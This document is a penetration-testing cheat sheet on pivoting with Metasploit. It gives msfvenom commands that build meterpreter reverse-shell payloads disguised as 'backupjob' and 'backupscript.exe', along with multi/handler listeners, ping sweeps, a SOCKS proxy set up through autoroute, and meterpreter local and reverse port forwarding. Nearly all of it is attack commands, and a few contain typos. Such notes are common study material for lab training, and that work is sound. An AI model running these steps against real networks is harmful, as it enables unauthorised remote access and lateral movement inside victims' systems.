- Create Payload for $PIVOT_HOST
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ATTACKER -f elf -o backupjob LPORT=8080
```

- Create multi/handler
```bash
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
run
```

- Execute the payload on $PIVOT_HOST
- Once the meterpreter session is created, we can run ping_sweep
```bash
run post/multi/gather/ping_sweep RHOSTS=$PIVOT_HOST_IP_RANGE
```

- Ping Sweep using commands
```shell
# Linux
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

- Configure MSF's SOCKS proxy
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# confirm proxy is running
jobs
```

- Adding a line to proxychains.conf if needed
```bash
socks4a 127.0.0.1 9050
```

We need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

- Create Routes with AutoRoute
```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Inside meterpreter session
run autoroute -s 172.16.5.0/23
```

- List active routes with AutoRoute
```bash
# Inside meterpreter
run autorroute -p
```

- Test Proxy & routing Functionality
```bash
proxychain nmap $TARGET_IP -p3389 -sT -v -Pn
```

-------------------
### PORT FORWARDING
------
- We can use portfw inside meterpreter
```bash
help portfwd
```

- Create Local TCP Relay
```bash
portfwd add -l 3300 -p 3389 -r $TARGET_IP
-l: start a listner on attacker's port (3300)
-r: forwards all connections to the remote target on port 3389 via  Meterpreter session
```

- Connect to Windows Target
```bash
# Attacker
xfreerdp /v: /u: /p:
```

-----
### METERPRETER REVERSE PORT FORWARDING
----
- Reverse Port Forwarding Rules
```bash
# Meterpreter
portfw add -R -l 8081 -p 1234 -L $ATTACKER
-R: Indicate reverse port forwarding
-l: attacker's litening port (8081)
-p: PIVOT HOST's port from which all connections will be forwarded to attackers
```

- Set up multi/handler
```bash
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run
```

We can now create a reverse shell payload that will send a connection back to our PIVOT server on `172.16.5.129`:`1234` when executed on our Windows host. Once our PIVOT server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

- Generate Windows Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```